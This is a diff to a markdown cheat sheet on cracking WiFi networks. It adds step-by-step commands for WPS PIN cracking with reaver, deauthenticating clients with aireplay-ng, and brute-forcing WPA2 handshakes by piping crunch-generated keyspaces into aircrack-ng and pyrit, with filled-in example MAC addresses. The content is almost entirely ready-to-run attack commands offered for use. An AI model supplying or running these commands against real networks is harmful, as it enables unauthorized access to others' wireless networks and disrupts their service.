@@ -157,7 +157,7 @@ WPS cracking
 
 **Example**
 >reaver -i wlan0mon -c 2 -b C8:D7:19:0D:E3:F7 -vv -S -N -L -d 15 -r 3:15 -T .5 -x 360
-
+**Example**
 
 
 
@@ -183,14 +183,19 @@ WPA2 cracking
  - Wait for "Association successful" message. Open a second terminal so you can still see the first window and run the following command. 
 >aireplay-ng -0 0 -a <mac address> wlan0mon
 
- - 
+ - Begin guessing the key using CPU only.
 >crunch <min key length> <max key length> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&* | aircrack-ng -b <mac address> -w - <log.cap>
 
+**Example**
+>crunch 0 25 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&* | aircrack-ng -b D8:20:43:54:12:21 -w - wifi.cap
+**Example
 
+ - Begin guessing the key using CPU and GPU.
+>crunch <min key length> <max key length> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 | pyrit -r <log.cap> -b <mac address> -i - attack_passthrough
 
-
-
-
+**Example**
+>crunch 0 25 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 | pyrit -r wifi.cap -b D8:20:43:54:12:21 -i - attack_passthrough
+**Example**
 
 
 Deauthorization attack
